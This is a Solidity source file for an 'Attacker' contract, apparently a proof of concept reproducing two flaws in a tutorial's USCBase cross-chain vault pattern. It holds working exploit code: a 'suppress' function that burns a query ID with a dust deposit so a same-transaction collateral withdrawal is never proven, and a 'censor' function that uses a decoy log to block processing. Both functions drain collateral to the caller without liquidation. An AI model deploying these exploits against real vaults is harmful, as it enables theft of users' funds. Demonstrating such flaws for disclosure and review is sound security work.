// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IVault {
    function openPosition(uint256 positionId, address token, uint256 amount) external;
    function deposit(uint256 positionId, uint256 amount) external;
    function withdraw(uint256 positionId, uint256 amount) external;
}

interface IDecoy {
    function emitFake(uint256 positionId, uint256 remaining) external;
}

/**
 * @title Attacker — reproduces two flaws in the tutorial's USCBase pattern
 * @dev Both attacks require emitting two logs in ONE source-chain transaction,
 * which is why they need a contract rather than an EOA.
 */
contract Attacker {
    IVault public immutable vault;
    IERC20 public immutable token;

    constructor(address _vault, address _token) {
        vault = IVault(_vault);
        token = IERC20(_token);
    }

    function openPosition(uint256 positionId, uint256 amount) external {
        token.approve(address(vault), type(uint256).max);
        vault.openPosition(positionId, address(token), amount);
    }

    /**
     * ATTACK A — action-selector suppression.
     * One transaction emits CollateralDeposited THEN CollateralWithdrawn.
     * Submitted to a USCBase manager with action=1 (deposit), the deposit branch
     * records healthy collateral and USCBase burns the queryId — which is
     * keccak(chainKey, blockHeight, txIndex) and does NOT include `action`.
     * The withdrawal in the same transaction is now permanently unprovable:
     * resubmitting with action=0 reverts "Query already processed".
     * Result: the collateral is gone and the position never liquidates.
     */
    function suppress(uint256 positionId, uint256 drainAmount) external {
        vault.deposit(positionId, 1); // dust — exists only to be the log the manager consumes
        vault.withdraw(positionId, drainAmount);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    /**
     * ATTACK B — decoy-log censorship.
     * One transaction emits a decoy CollateralWithdrawn from a throwaway contract
     * FIRST, then the genuine one from the real vault. A manager that reads
     * logs[0] and reverts on the emitter check can never process this transaction.
     * The emitter guard — the project's own marquee defense — becomes the
     * censorship vector, and the withdrawal is permanently unprovable.
     */
    function censor(address decoy, uint256 positionId, uint256 drainAmount) external {
        IDecoy(decoy).emitFake(positionId, 0);
        vault.withdraw(positionId, drainAmount);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}
